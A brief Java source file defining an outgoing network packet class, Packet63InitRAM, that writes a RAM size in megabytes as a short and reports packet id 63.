package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;


public class Packet63InitRAM extends AbstractOutgoingPacket {

	private short mbRam;

	public Packet63InitRAM(short mbRam) {
		this.mbRam = mbRam;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeShort(mbRam);
	}

	@Override
	public byte getPacketId() {
		return (byte) 63;
	}
}
